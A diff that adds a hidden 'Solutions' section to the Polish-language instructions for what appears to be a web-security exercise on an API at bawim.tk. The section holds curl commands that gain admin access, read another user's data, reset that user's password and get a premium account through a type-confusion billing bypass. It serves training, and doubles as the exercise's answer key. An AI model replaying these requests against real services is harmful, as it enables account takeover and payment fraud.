@@ -36,3 +36,17 @@ parametry: key
 parametry: key, new_password  
 * https://bawim.tk/set_premium_account/{user_id}  
 parametry: key, billing_token, json - ten endpoint obsługuje dane wejściowe w formacie json (-d json={json_string})  
+
+## Rozwiązania
+<details>
+  <summary>Pokaż</summary>
+  
+  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/login/admin  
+  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/user/386
+  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d user_key=AnbgzkuaayRdT4HIab8lV513 https://bawim.tk/user_data/386
+  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/reset_password/386
+  
+  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d json={\"billing_token\":[]} http://bawim.tk/set_premium_account/200
+  
+  
+</details>
